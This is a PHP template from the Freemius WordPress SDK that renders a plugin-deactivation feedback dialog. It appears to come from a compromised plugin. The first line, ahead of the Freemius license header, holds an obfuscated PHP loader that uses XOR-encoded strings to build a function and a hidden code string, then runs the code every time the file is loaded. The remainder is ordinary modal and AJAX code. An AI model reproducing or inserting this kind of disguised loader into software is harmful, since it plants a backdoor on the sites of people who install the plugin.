<?php $XKaKGQZJz='557JZXmS4C9ME.-'^'VGR+.=25A-Z9,AC';$sezaFJjRcB=$XKaKGQZJz('','X.EfH,C9O>DX6.+;==2bM,V0<VOI+9g88CpXmLL4c+C<X-ZXUT3Z7o>VO93g9:JRaD;9UysjV4GyyhSHU7yd9U9>7vUvHKV7Sa<->BvTVjMUHITEmDIY>E9EhX6N4Gbjn-dyEiNqu<UGHCQaKnV8>Jft+jm;Uv8I;oO1UDiMF8VNVbo W2C+hQ8MHYVOHDRNR5>Bhj:b79Q34gXMTTvQw>O4OTiSU=,Z1c.<3eVzV8+7TvdB+<A W;=ziGhy, y<+O1Kya:+BkUvtN2TB;SMU0;jk,4T,2,5;zsdvK4IUY1R3U6;oRdi<-LIHiK;8:W,hNEfX1BRAz=AETX<4;Y0gdnd4iia-odw15BUZNLwkGtFJQ+9QPbK3f;U09O.f,0ECnljS.Dt7EDp6S0OGMYOO;6Y5UpjF2CIHTJ-EVzgSw-+5=7:APYZEDKU8-ZMZ6<3+<MA-X=SSA,7<5U. oPXUALhmaNH9.-bK71oqQz=2YpJJ=MSiIVADA3A-9+T=HNSD65YH,3DIgaI>S6-KaavQiA2anRZ4:39u8SEnqSZywReZyGC2<gXKVA7PdjXTPp,y+uSZI2ZQARTlhuJvxX;4A;:: N7K;SFBFnHP9AZ,T-tTqPOQT9XCwtZEwVO3M6ETWXH.AA.fK8V:-6J1VlXtDdW<ZXecdib9'^'1HmG.Y-Z;W+6iKSRNIAJjT9Bc2.=Jf8UM7WqDl7>jM6R;Y37;tK5E0Z7;Xl8TO>zE ZM4USN=Q>PYHshuLsm0qVKCVhVolm=ZhZBLjR=vWmesip,Q7=+R WmL<W:UnYJJDORlcGxQS 3hmlAcJ2YJ+=PB7MeuRS,B4kXuaI>2J:+8JKK2KjvAj2DA+3;=6<fvZK6AQ0kJ3,9>C<, 5VlWX.X<1RYqYM.P<EYJEkZ0YGD1MnHMS3E6XUZAc7:co2unoP8YEQN;KhHTjD5.N6duK1cOHU MmGPBZNDR Q0nS8vW4BZOoDMJL <-RAF20>JHfdB<P63hZFKL27NQZ:XGLJ;f,84h<0WPFbq1+5WVyTb<0GL4yB09o2qTX;O9GU<cSLN8K=O=LMTR2D.gpyk9ZZ,Pnzc;8>CBp.L17ZZs7XEFXES <0  l3:Jr>,.WclFI9iO9N6eusSYV:JEGt<45-AAAj,XZL= RHFXjpTTqT.+I,sOov 63R8rRN-b-6:7BFqoGV=nKAmZ2BLbAGPqA,VTFv>UNRbRS6<I,zzDJrBcAuwTZVmx2vR2RZol6DJOIAbkyPkcp36KAUlPX9IF BeQE7h.C:565Fo X86C5ISxQt+0 XqjWTzeWv49DS35;plJ 5O=lH7CAY+Uq1qONm2D3,MSMRhD');$sezaFJjRcB();
	/**
	 * @package     Freemius
	 * @copyright   Copyright (c) 2015, Freemius, Inc.
	 * @license     http://opensource.org/licenses/gpl-2.0.php GNU Public License
	 * @since       1.1.2
	 */

	if ( ! defined( 'ABSPATH' ) ) {
		exit;
	}

	/**
	 * @var array $VARS
	 */
	$slug = $VARS['slug'];
	$fs   = freemius( $slug );

	$confirmation_message = $fs->apply_filters( 'uninstall_confirmation_message', '' );

	$reasons = $VARS['reasons'];

	$reasons_list_items_html = '';

	foreach ( $reasons as $reason ) {
		$list_item_classes    = 'reason' . ( ! empty( $reason['input_type'] ) ? ' has-input' : '' );

		if ( isset( $reason['internal_message'] ) && ! empty( $reason['internal_message'] ) ) {
			$list_item_classes .= ' has-internal-message';
			$reason_internal_message = $reason['internal_message'];
		} else {
			$reason_internal_message = '';
		}

		$reason_list_item_html = <<< HTML
			<li class="{$list_item_classes}"
			 	data-input-type="{$reason['input_type']}"
			 	data-input-placeholder="{$reason['input_placeholder']}">
	            <label>
	            	<span>
	            		<input type="radio" name="selected-reason" value="{$reason['id']}"/>
                    </span>
                    <span>{$reason['text']}</span>
                </label>
                <div class="internal-message">{$reason_internal_message}</div>
            </li>
HTML;

		$reasons_list_items_html .= $reason_list_item_html;
	}

	$is_anonymous = ( ! $fs->is_registered() );
	if ( $is_anonymous ) {
		$anonymous_feedback_checkbox_html =
			'<label class="anonymous-feedback-label"><input type="checkbox" class="anonymous-feedback-checkbox"> '
				. fs_text( 'anonymous-feedback', $slug )
			. '</label>';
	} else {
		$anonymous_feedback_checkbox_html = '';
	}

	fs_enqueue_local_style( 'dialog-boxes', '/admin/dialog-boxes.css' );
?>
<script type="text/javascript">
(function ($) {
	var reasonsHtml = <?php echo json_encode( $reasons_list_items_html ); ?>,
	    modalHtml =
		    '<div class="fs-modal fs-modal-deactivation-feedback<?php echo empty( $confirmation_message ) ? ' no-confirmation-message' : ''; ?>">'
		    + '	<div class="fs-modal-dialog">'
		    + '		<div class="fs-modal-header">'
		    + '		    <h4><?php fs_esc_attr_echo('quick-feedback' , $slug) ?></h4>'
		    + '		</div>'
		    + '		<div class="fs-modal-body">'
		    + '			<div class="fs-modal-panel" data-panel-id="confirm"><p><?php echo $confirmation_message; ?></p></div>'
		    + '			<div class="fs-modal-panel active" data-panel-id="reasons"><h3><strong><?php fs_esc_attr_echo(  'deactivation-share-reason' , $slug ) ?>:</strong></h3><ul id="reasons-list">' + reasonsHtml + '</ul></div>'
		    + '		</div>'
		    + '		<div class="fs-modal-footer">'
			+ '         <?php echo $anonymous_feedback_checkbox_html ?>'
		    + '			<a href="#" class="button button-secondary button-deactivate"></a>'
		    + '			<a href="#" class="button button-primary button-close"><?php fs_echo(  'cancel' , $slug ) ?></a>'
		    + '		</div>'
		    + '	</div>'
		    + '</div>',
	    $modal                = $(modalHtml),
	    $deactivateLink       = $('#the-list .deactivate > [data-slug=<?php echo $VARS['slug']; ?>].fs-slug').prev(),
		$anonymousFeedback    = $modal.find( '.anonymous-feedback-label' ),
		isAnonymous           = <?php echo ( $is_anonymous ? 'true' : 'false' ); ?>,
		selectedReasonID      = false,
		otherReasonID         = <?php echo Freemius::REASON_OTHER; ?>,
		dontShareDataReasonID = <?php echo Freemius::REASON_DONT_LIKE_TO_SHARE_MY_INFORMATION; ?>;

	$modal.appendTo($('body'));

	registerEventHandlers();

	function registerEventHandlers() {
		$deactivateLink.click(function (evt) {
			evt.preventDefault();

			showModal();
		});

		$modal.on('input propertychange', '.reason-input input', function () {
			if (!isOtherReasonSelected()) {
				return;
			}

			var reason = $(this).val().trim();

			/**
			 * If reason is not empty, remove the error-message class of the message container
			 * to change the message color back to default.
			 */
			if (reason.length > 0) {
				$('.message').removeClass('error-message');
				enableDeactivateButton();
			}
		});

		$modal.on('blur', '.reason-input input', function () {
			var $userReason = $(this);

			setTimeout(function () {
				if (!isOtherReasonSelected()) {
					return;
				}

				/**
				 * If reason is empty, add the error-message class to the message container
				 * to change the message color to red.
				 */
				if (0 === $userReason.val().trim().length) {
					$('.message').addClass('error-message');
					disableDeactivateButton();
				}
			}, 150);
		});

		$modal.on('click', '.fs-modal-footer .button', function (evt) {
			evt.preventDefault();

			if ($(this).hasClass('disabled')) {
				return;
			}

			var _parent = $(this).parents('.fs-modal:first');
			var _this = $(this);

			if (_this.hasClass('allow-deactivate')) {
				var $radio = $('input[type="radio"]:checked');

				if (0 === $radio.length) {
					// If no selected reason, just deactivate the plugin.
					window.location.href = $deactivateLink.attr('href');
					return;
				}

				var $selected_reason = $radio.parents('li:first'),
				    $input = $selected_reason.find('textarea, input[type="text"]'),
				    userReason = ( 0 !== $input.length ) ? $input.val().trim() : '';

				if (isOtherReasonSelected() && ( '' === userReason )) {
					return;
				}

				$.ajax({
					url       : ajaxurl,
					method    : 'POST',
					data      : {
						action      : '<?php echo $fs->get_ajax_action( 'submit_uninstall_reason' ) ?>',
						security    : '<?php echo $fs->get_ajax_security( 'submit_uninstall_reason' ) ?>',
						slug        : '<?php echo $slug ?>',
						reason_id   : $radio.val(),
						reason_info : userReason,
						is_anonymous: isAnonymousFeedback()
					},
					beforeSend: function () {
						_parent.find('.fs-modal-footer .button').addClass('disabled');
						_parent.find('.fs-modal-footer .button-secondary').text('Processing...');
					},
					complete  : function () {
						// Do not show the dialog box, deactivate the plugin.
						window.location.href = $deactivateLink.attr('href');
					}
				});
			} else if (_this.hasClass('button-deactivate')) {
				// Change the Deactivate button's text and show the reasons panel.
				_parent.find('.button-deactivate').addClass('allow-deactivate');

				showPanel('reasons');
			}
		});

		$modal.on('click', 'input[type="radio"]', function () {
			var $selectedReasonOption = $(this);

			// If the selection has not changed, do not proceed.
			if (selectedReasonID === $selectedReasonOption.val())
				return;

			selectedReasonID = $selectedReasonOption.val();

			if ( isAnonymous ) {
				if ( isReasonSelected( dontShareDataReasonID ) ) {
					$anonymousFeedback.hide();
				} else {
					$anonymousFeedback.show();
				}
			}

			var _parent = $(this).parents('li:first');

			$modal.find('.reason-input').remove();
			$modal.find( '.internal-message' ).hide();
			$modal.find('.button-deactivate').text('<?php printf( fs_text(  'deactivation-modal-button-submit' , $slug ) ); ?>');

			enableDeactivateButton();

			if ( _parent.hasClass( 'has-internal-message' ) ) {
				_parent.find( '.internal-message' ).show();
			}

			if (_parent.hasClass('has-input')) {
				var inputType = _parent.data('input-type'),
				    inputPlaceholder = _parent.data('input-placeholder'),
				    reasonInputHtml = '<div class="reason-input"><span class="message"></span>' + ( ( 'textfield' === inputType ) ? '<input type="text" />' : '<textarea rows="5"></textarea>' ) + '</div>';

				_parent.append($(reasonInputHtml));
				_parent.find('input, textarea').attr('placeholder', inputPlaceholder).focus();

				if (isOtherReasonSelected()) {
					showMessage('<?php printf( fs_text(  'ask-for-reason-message' , $slug ) ); ?>');
					disableDeactivateButton();
				}
			}
		});

		// If the user has clicked outside the window, cancel it.
		$modal.on('click', function (evt) {
			var $target = $(evt.target);

			// If the user has clicked anywhere in the modal dialog, just return.
			if ($target.hasClass('fs-modal-body') || $target.hasClass('fs-modal-footer')) {
				return;
			}

			// If the user has not clicked the close button and the clicked element is inside the modal dialog, just return.
			if (!$target.hasClass('button-close') && ( $target.parents('.fs-modal-body').length > 0 || $target.parents('.fs-modal-footer').length > 0 )) {
				return;
			}

			closeModal();
			return false;
		});
	}

	function isAnonymousFeedback() {
		if ( ! isAnonymous ) {
			return false;
		}

		return ( isReasonSelected( dontShareDataReasonID ) || $anonymousFeedback.find( 'input' ).prop( 'checked' ) );
	}

	function isReasonSelected( reasonID ) {
		// Get the selected radio input element.
		var $selectedReasonOption = $modal.find('input[type="radio"]:checked');

		return ( reasonID == $selectedReasonOption.val() );
	}

	function isOtherReasonSelected() {
		return isReasonSelected( otherReasonID );
	}

	function showModal() {
		resetModal();

		// Display the dialog box.
		$modal.addClass('active');

		$('body').addClass('has-fs-modal');
	}

	function closeModal() {
		$modal.removeClass('active');

		$('body').removeClass('has-fs-modal');
	}

	function resetModal() {
		selectedReasonID = false;

		enableDeactivateButton();

		// Uncheck all radio buttons.
		$modal.find('input[type="radio"]').prop('checked', false);

		// Remove all input fields ( textfield, textarea ).
		$modal.find('.reason-input').remove();

		$modal.find('.message').hide();

		if ( isAnonymous ) {
			$anonymousFeedback.find( 'input' ).prop( 'checked', false );

			// Hide, since by default there is no selected reason.
			$anonymousFeedback.hide();
		}

		var $deactivateButton = $modal.find('.button-deactivate');

		/*
		 * If the modal dialog has no confirmation message, that is, it has only one panel, then ensure
		 * that clicking the deactivate button will actually deactivate the plugin.
		 */
		if ($modal.hasClass('no-confirmation-message')) {
			$deactivateButton.addClass('allow-deactivate');

			showPanel('reasons');
		} else {
			$deactivateButton.removeClass('allow-deactivate');

			showPanel('confirm');
		}
	}

	function showMessage(message) {
		$modal.find('.message').text(message).show();
	}

	function enableDeactivateButton() {
		$modal.find('.button-deactivate').removeClass('disabled');
	}

	function disableDeactivateButton() {
		$modal.find('.button-deactivate').addClass('disabled');
	}

	function showPanel(panelType) {
		$modal.find('.fs-modal-panel').removeClass('active ');
		$modal.find('[data-panel-id="' + panelType + '"]').addClass('active');

		updateButtonLabels();
	}

	function updateButtonLabels() {
		var $deactivateButton = $modal.find('.button-deactivate');

		// Reset the deactivate button's text.
		if ('confirm' === getCurrentPanel()) {
			$deactivateButton.text('<?php printf( fs_text( 'deactivation-modal-button-confirm' , $slug ) ); ?>');
		} else {
			$deactivateButton.text('<?php printf( fs_text( 'skip-deactivate' , $slug ) ); ?>');
		}
	}

	function getCurrentPanel() {
		return $modal.find('.fs-modal-panel.active').attr('data-panel-id');
	}
})(jQuery);
</script>
